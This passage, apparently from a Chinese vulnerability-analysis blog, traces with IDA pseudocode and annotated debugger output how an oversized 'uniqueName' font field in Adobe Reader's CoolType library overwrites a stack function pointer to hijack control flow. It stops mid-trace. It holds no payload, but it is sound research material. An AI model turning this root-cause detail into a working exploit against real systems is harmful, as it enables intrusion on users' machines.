title="2.4、触发原因"></a>2.4、触发原因</h5><p>&emsp;&emsp;通过前面的分析我们可以知道,地址<code>0x0808B308</code>处的<code>调用指令</code>是通过以<code>eax的值</code>为地址,得到存储在<code>地址处的值</code>,作为所调用<code>函数的地址</code>,进行函数调用的。<code>eax=0x0012E6D0</code>,所以<code>函数的地址值</code>存储在<code>栈</code>上,而且刚好落在我们构造的<code>“uniqueName”字段</code>在栈上的缓冲区内,所以我们可以<code>覆盖</code>这个函数的<code>地址值</code>,达到<code>劫持程序控制流</code>的目的。而我们往上回溯,<code>eax的值</code>是以<code>edi+0x3C</code>为地址的变量的值。<code>edi</code>的值为<code>0x0012E718</code>,正是前面通过<code>sub_80DD0B3()</code>函数调用<code>sub_080151B5()</code>函数清零的<code>栈空间的首地址</code>,也是<code>sub_80DD0B3()</code>函数的<code>ebp</code>。在执行<code>sub_80DD0B3()</code>函数之前,<code>edi+0x3C=0x0012E754</code>处的值为<code>0xFFFFFFFF</code>,而在调用<code>0x080DD2F3</code>处的<code>sub_803DCF9()</code>函数时,已经被赋值为了<code>0x0012E6D0</code>。说明赋值的语句在调用<code>sub_803DCF9()</code>函数之前。这里<code>分析的目的</code>主要是看是否覆盖了<code>特殊结构的指针</code>,而达到了程序<code>控制流的劫持</code>。比如,是否覆盖了<code>SEH异常处理结构</code>,又或者是覆盖了<code>虚表指针</code>和虚表中的<code>虚函数地址</code>。首先在IDA中看一下,是哪里赋的值：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_80DD0B3</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, _DWORD *a5, <span class="keyword">int</span> a6)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">int</span> v10; <span class="comment">// [esp+B8h] [ebp-68h],[0x0012E718-0x68]=[0x0012E6B0]</span></span><br><span class="line">    <span class="keyword">char</span> v11; <span class="comment">// [esp+D8h] [ebp-48h],[0x0012E718-0x48]=[0x0012E6D0]存储函数地址的变量(函数指针)</span></span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">char</span> v31; <span class="comment">// [esp+134h] [ebp+14h],[0x0012E718+0x14]=[0x0012E72C]</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v32; <span class="comment">// [esp+15Ch] [ebp+3Ch],[0x0012E718+0x3C]=[0x0012E754]</span></span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">//&amp;v10为对象首地址,此函数应为对象(0x0012E6B0)的有参构造函数</span></span><br><span class="line">    sub_8083452(&amp;v10, a2);<span class="comment">//执行完后,[ebp-0x48]=[0x0012E6D0]=0x080833EF,这是一个函数的地址</span></span><br><span class="line">    v25 = <span class="number">1</span>;</span><br><span class="line">    sub_8084D13(</span><br><span class="line">        (<span class="keyword">void</span> (__cdecl **)(_DWORD, _DWORD, _DWORD, _DWORD))(v10 != <span class="number">0</span> ? (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v11 : <span class="number">0</span>),</span><br><span class="line">        &amp;v20,</span><br><span class="line">        &amp;v18,</span><br><span class="line">        (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v17,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">1</span>);</span><br><span class="line">    ......</span><br><span class="line">    sub_801605B(&amp;v31, &amp;v10); <span class="comment">//&amp;v31为对象首地址</span></span><br><span class="line">    v32 = v10 != <span class="number">0</span> ? (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v11 : <span class="number">0</span>; <span class="comment">//[0x0012E754]=0x0012E6D0,v32[0x0012E754]为对象(0x0012E718)中的一个成员变量</span></span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">对象(0x0012E6B0)的内存布局(初始):</span></span><br><span class="line"><span class="comment">0x0012E6B0 *v2 = *a2     -| &#123;sub_8014E64&#125;</span></span><br><span class="line"><span class="comment">0x0012E6B4 v2[1] = a2[1] -|</span></span><br><span class="line"><span class="comment">0x0012E6B8 v2[2] = 0; ------------------------|</span></span><br><span class="line"><span class="comment">0x0012E6BC *a2 = v9   -|                      |</span></span><br><span class="line"><span class="comment">0x0012E6C0 a2[1] = a3  |                      |</span></span><br><span class="line"><span class="comment">0x0012E6C4 a2[2] = v8  | &#123;sub_8080FB5&#125;        | &#123;sub_8083452&#125;</span></span><br><span class="line"><span class="comment">0x0012E6C8 a2[3] = v7 -|                      |</span></span><br><span class="line"><span class="comment">0x0012E6CC v2[7] = v2[5] ---------------------|</span></span><br><span class="line"><span class="comment">0x0012E6D0 v2[8] = sub_80833EF ---------------| (函数指针)</span></span><br><span class="line"><span class="comment">0x0012E6D4 v2[9] = v2 ------------------------|</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;由这可知,<code>v32变量</code>在栈上的位置为<code>ebp+0x3C</code>,即v32为栈上<code>0x0012E718+0x3C=0x0012E754</code>处的变量。最下面的那一行代码是它的<code>赋值语句</code>。由于我对<code>SEH结构</code>是怎么被放在<code>栈</code>上,并形成<code>SEH链表</code>的细节不太熟悉,所以,顺便分析了一下函数向栈上<code>构建SEH结构</code>的过程。下面是一些详细的调试信息：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><span class="line">***********************************************************************************</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> __cdecl sub_80DD0B3(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, _<span class="built_in">DWORD</span> *a5, <span class="keyword">int</span> a6)</span><br><span class="line"></span><br><span class="line">***********************************************************************************</span><br><span class="line"><span class="symbol">.text:</span>080DD0B3        <span class="keyword">push</span>    <span class="built_in">ebp</span>                              <span class="comment">; [0x0012E7E8]=ebp=0x0012E838,父函数ebp</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0B4        <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">0CCh</span>                        <span class="comment">; esp=0x0012E71C</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0BA        <span class="keyword">lea</span>     <span class="built_in">ebp</span>, [<span class="built_in">esp</span>-<span class="number">4</span>]                     <span class="comment">; ebp=0x0012E718,本函数ebp</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0BE        <span class="keyword">mov</span>     <span class="built_in">eax</span>, ___security_cookie          <span class="comment">; eax=0x78FC1194</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0C3        <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">ebp</span>                         <span class="comment">; eax=eax^ebp=0x78EEF68C</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0C5        <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_4], <span class="built_in">eax</span>            <span class="comment">; [ebp+0xcc] = [0x0012E7E4] = 0x78EEF68C,父函数ebp之上</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0CB        <span class="keyword">push</span>    <span class="number">104h</span>                             <span class="comment">; [esp-0x4]=[0x0012E718]=0x104,(__EH_prolog3中分配的栈空间大小)</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0D0        <span class="keyword">mov</span>     <span class="built_in">eax</span>, offset loc_8182A36          <span class="comment">; eax=0x8182A36(__security_check_cookie函数地址)</span></span><br><span class="line"><span class="symbol">.text:</span>080DD0D5        <span class="keyword">call</span>    __EH_prolog3                     <span class="comment">; [0x0012E714]=ret=0x080DD0DA</span></span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line"><span class="symbol">.text:</span>0804819E __EH_prolog3    proc <span class="built_in">near</span>(向栈上写入SEH结构)</span><br><span class="line"></span><br><span class="line">0804819E       <span class="keyword">push</span> <span class="built_in">eax</span>                            <span class="comment">; [0x0012E710]=eax=0x08182A36(__security_check_cookie函数地址)SE处理程序</span></span><br><span class="line">0804819F       <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="number">0</span>]               <span class="comment">; [0x0012E70C]=0x0012E82C,指向下一个SEH记录的指针</span></span><br><span class="line">080481A6       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">esp</span>+<span class="number">0xC</span>]      <span class="comment">; eax=esp+0xc=0x0012E70C+0xC=0x0012E718</span></span><br><span class="line">080481AA       <span class="keyword">sub</span> <span class="built_in">esp</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">esp</span>+<span class="number">0xC</span>]      <span class="comment">; esp=esp-[0x0012E718]=0x0012E70C-0x104=0x0012E608,分配栈空间</span></span><br><span class="line">                                                栈: 0012E608   7C812FD3  返回到 kernel32.7C812FD3 来自 ntdll.RtlRaiseException</span><br><span class="line">080481AE       <span class="keyword">push</span> <span class="built_in">ebx</span>                            <span class="comment">; [0x0012E604]=ebx=0x0</span></span><br><span class="line">080481AF       <span class="keyword">push</span> <span class="built_in">esi</span>                            <span class="comment">; [0x0012E600]=esi=0x0823AE9C(.data段)</span></span><br><span class="line">080481B0       <span class="keyword">push</span> <span class="built_in">edi</span>                            <span class="comment">; [0x0012E5FC]=edi=0x0012E858</span></span><br><span class="line">080481B1       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>],<span class="built_in">ebp</span>          <span class="comment">; [eax]=[0x0012E718]=ebp=0x0012E718,覆盖传进来的参数0x104</span></span><br><span class="line">080481B3       <span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">eax</span>                         <span class="comment">; </span></span><br><span class="line">080481B5       <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x8230FB8</span>]    <span class="comment">; eax=ds:[0x8230FB8]=0x78FC1194(___security_cookie)</span></span><br><span class="line">080481BA       <span class="keyword">xor</span> <span class="built_in">eax</span>,<span class="built_in">ebp</span>                         <span class="comment">; eax=eax^ebp=0x78FC1194^0x0012E718=0x78EEF68C,再计算一次security cookie</span></span><br><span class="line">080481BC       <span class="keyword">push</span> <span class="built_in">eax</span>                            <span class="comment">; [0x0012E5F8]=eax=0x78EEF68C,异或之后的sec cookie</span></span><br><span class="line">080481BD       <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x4</span>]         <span class="comment">; [0x0012E5F4]=[0x0012E718-0x4]=[0x0012E714]=0x080DD0DA,返回地址</span></span><br><span class="line">080481C0       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x4</span>],-<span class="number">0x1</span>     <span class="comment">; [0x0012E714]=0xFFFFFFFF,本来的返回地址被修改</span></span><br><span class="line">080481C7       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0xC</span>]      <span class="comment">; eax=ebp-0xc=0x0012E718-0xc=0x0012E70C(本SEH结构地址)</span></span><br><span class="line">080481CA       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="number">0</span>],<span class="built_in">eax</span>            <span class="comment">; fs:[0] = 0x0012E70C,保存当前SEH结构指针</span></span><br><span class="line">080481D0       <span class="keyword">retn</span>                                <span class="comment">; ret</span></span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">......</span><br><span class="line"><span class="symbol">.text:</span>080DD113 loc_80DD113:                            <span class="comment">; CODE XREF: sub_80DD0B3+5B↑j</span></span><br><span class="line"><span class="symbol">.text:</span>080DD113                 <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; eax=a2=0x0012E818,[0x0012E818]=0x0494F3E8</span></span><br><span class="line"><span class="symbol">.text:</span>080DD114                 <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_138]          <span class="comment">; eac=ebp-0x68=0x0012E718-0x68=0x0012E6B0,对象(0x0012E6B0)首地址</span></span><br><span class="line"><span class="symbol">.text:</span>080DD117                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_F0], <span class="number">40000000h</span>     <span class="comment">; [ebp-0x20]=[0x0012E718-0x20]=[0x0012E6F8]=0x40000000</span></span><br><span class="line"><span class="symbol">.text:</span>080DD11E                 <span class="keyword">call</span>    sub_8083452</span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">********************************************************************</span><br><span class="line"></span><br><span class="line">        _<span class="built_in">DWORD</span> *__thiscall sub_8083452(_<span class="built_in">DWORD</span> *this, <span class="keyword">int</span> a2)</span><br><span class="line"></span><br><span class="line">********************************************************************</span><br><span class="line"><span class="number">08083452</span>    6A 0C              <span class="keyword">push</span> <span class="number">0xC</span></span><br><span class="line"><span class="number">08083454</span>    B8 0A581708        <span class="keyword">mov</span> <span class="built_in">eax</span>,CoolType.0817580A</span><br><span class="line"><span class="number">08083459</span>    E8 404DFCFF        <span class="keyword">call</span> CoolType.0804819E</span><br><span class="line">0808345E    8BF1               <span class="keyword">mov</span> <span class="built_in">esi</span>,<span class="built_in">ecx</span>                                      &lt;-----<span class="comment">; esi=ecx=0x0012E6B0,对象(0x0012E6B0)首地址</span></span><br><span class="line"><span class="number">08083460</span>    <span class="number">8975</span> F0            <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x10</span>],<span class="built_in">esi</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">08083489</span>    8B46 <span class="number">14</span>            <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>+<span class="number">0x14</span>]                  <span class="comment">; eax=[esi+0x14]=[0x0012E6C4]=0x049513E0,字体对象</span></span><br><span class="line">0808348C    <span class="number">8946</span> 1C            <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>+<span class="number">0x1C</span>],<span class="built_in">eax</span>                  <span class="comment">; [esi+0x1C]=[0x0012E6CC]=eax=0x049513E0</span></span><br><span class="line">0808348F    C746 <span class="number">20</span> EF330808   <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>+<span class="number">0x20</span>],CoolType.080833EF    &lt;-----<span class="comment">; [esi+0x20]=[0x0012E6B0+0x20]=[0x0012E6D0]=0x080833EF</span></span><br><span class="line"><span class="number">08083496</span>    <span class="number">8976</span> <span class="number">24</span>            <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>+<span class="number">0x24</span>],<span class="built_in">esi</span></span><br><span class="line"><span class="number">08083499</span>    8BC6               <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">esi</span></span><br><span class="line">0808349B    E8 D64DFCFF        <span class="keyword">call</span> CoolType<span class="meta">.08048276</span></span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">***********************************************************************************</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> __cdecl sub_80DD0B3(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, _<span class="built_in">DWORD</span> *a5, <span class="keyword">int</span> a6)</span><br><span class="line"></span><br><span class="line">***********************************************************************************</span><br><span class="line">080DD168       <span class="keyword">call</span> CoolType.080151B5              <span class="comment">; 清零0x0012E718后面的一些数据,0x0012E718应该为某个对象的首地址,此函数像是类的构造函数</span></span><br><span class="line">.......</span><br><span class="line">080DD1A3       <span class="keyword">call</span> CoolType.0801605B</span><br><span class="line">080DD1A8       <span class="keyword">mov</span> <span class="built_in">esi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x68</span>]     <span class="comment">; esi=[ebp-0x68]=[0x0012E6B0]=0x02137E88</span></span><br><span class="line">080DD1AB       <span class="keyword">neg</span> <span class="built_in">esi</span>                             <span class="comment">; 求补: esi=0xFDEC8178(按位取反再+1),求补操作和求一个数的补码概念是不一样的</span></span><br><span class="line">080DD1AD       <span class="keyword">sbb</span> <span class="built_in">esi</span>,<span class="built_in">esi</span>                         <span class="comment">; 带借位减法:esi=FFFFFFFF</span></span><br><span class="line">080DD1AF       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x48</span>]     <span class="comment">; eax=ebp-0x68=0x0012E718-0x48=0x0012E6D0 ,函数指针地址</span></span><br><span class="line">080DD1B2       <span class="keyword">and</span> <span class="built_in">esi</span>,<span class="built_in">eax</span>                         <span class="comment">; esi=esi and eax=0x0012E6D0 </span></span><br><span class="line">080DD1B4       <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x28</span>],<span class="number">0x1</span>     <span class="comment">; [ebp-0x28]=[0x0012E718-0x28]=[0x0012E6F0]=0x1</span></span><br><span class="line">080DD1B8       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0x3C</span>],<span class="built_in">esi</span>     <span class="comment">; [ebp+0x3C]=[0x0012E754]=esi=0x0012E6D0 &lt;-------这里得到赋值,在这之前[0x0012E6D0]已在sub_8083452()[对象(0x0012E6B0)的构造函数]中得到赋值,[0x0012E6D0]=0x080833EF,0x0012E6D0处的成员变量为函数指针</span></span><br><span class="line">080DD1BB       <span class="keyword">jnz</span> CoolType.080DD2D1               <span class="comment">; 不跳转</span></span><br><span class="line">080DD1C1       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x10</span>]</span><br><span class="line">080DD1C4       <span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line">080DD1C5       <span class="keyword">push</span> <span class="built_in">ebx</span></span><br><span class="line">080DD1C6       <span class="keyword">push</span> <span class="number">0x2</span></span><br><span class="line">080DD1C8       <span class="keyword">push</span> <span class="built_in">esi</span></span><br><span class="line">080DD1C9       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x10</span>],<span class="built_in">ebx</span></span><br><span class="line">080DD1CC       <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>]             <span class="comment">; CoolType.080833EF</span></span><br><span class="line">080DD1CE       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x10</span>]</span><br><span class="line">080DD1D1       <span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line">080DD1D2       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x3C</span>]</span><br><span class="line">080DD1D5       <span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line">080DD1D6       <span class="keyword">push</span> <span class="built_in">ebx</span></span><br><span class="line">080DD1D7       <span class="keyword">push</span> <span class="built_in">esi</span></span><br><span class="line">080DD1D8       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x10</span>],<span class="built_in">edi</span></span><br><span class="line">080DD1DB       <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>]             <span class="comment">; CoolType.080833EF</span></span><br><span class="line">080DD1DD       <span class="keyword">add</span> <span class="built_in">esp</span>,<span class="number">0x20</span></span><br><span class="line">080DD1E0       <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x10</span>],<span class="built_in">edi</span></span><br><span class="line">080DD1E3       <span class="keyword">je</span> short CoolType.080DD1F0</span><br><span class="line">080DD1E5       <span class="keyword">push</span> CoolType.081BA878</span><br><span class="line">080DD1EA       <span class="keyword">call</span> CoolType.0809D83E</span><br><span class="line">080DD1EF       <span class="keyword">pop</span> <span class="built_in">ecx</span></span><br><span class="line">080DD1F0       <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x10</span>]</span><br><span class="line">080DD1F3       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x3C</span>]</span><br><span class="line">080DD1F6       <span class="keyword">push</span> CoolType.0819D5F8              <span class="comment">; ASCII "ttcf"</span></span><br><span class="line">080DD1FB       <span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line">080DD1FC       <span class="keyword">call</span> &lt;<span class="keyword">jmp</span>.&amp;MSVCR80.memcmp&gt;</span><br><span class="line">080DD201       <span class="keyword">add</span> <span class="built_in">esp</span>,<span class="number">0xC</span></span><br><span class="line">080DD204       <span class="keyword">test</span> <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line">080DD206       <span class="keyword">jnz</span> CoolType.080DD2D1               <span class="comment">; 跳转</span></span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line"><span class="symbol">.text:</span>080DD2D1 loc_80DD2D1:                          </span><br><span class="line"><span class="symbol">.text:</span>080DD2D1                              </span><br><span class="line"><span class="symbol">.text:</span>080DD2D1         <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_1E0]</span><br><span class="line"><span class="symbol">.text:</span>080DD2D7         <span class="keyword">call</span>    sub_80172FB</span><br><span class="line"><span class="symbol">.text:</span>080DD2DC         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_E8], <span class="built_in">ebx</span>                       <span class="comment">;   [ebp-0x18]=[0x0012E700]=0x0</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2DF         <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_E8]                       <span class="comment">;   eax=ebp-0x18=0x0012E700</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2E2         <span class="keyword">push</span>    <span class="built_in">eax</span>                                          <span class="comment">; arg_4: [0x0012E5F4]=eax=0x0012E700</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2E3         <span class="keyword">push</span>    <span class="built_in">ebx</span>                                          <span class="comment">; arg_3: [0x0012E5F0]=ebx=0x0</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2E4         <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_1E0]                      <span class="comment">;   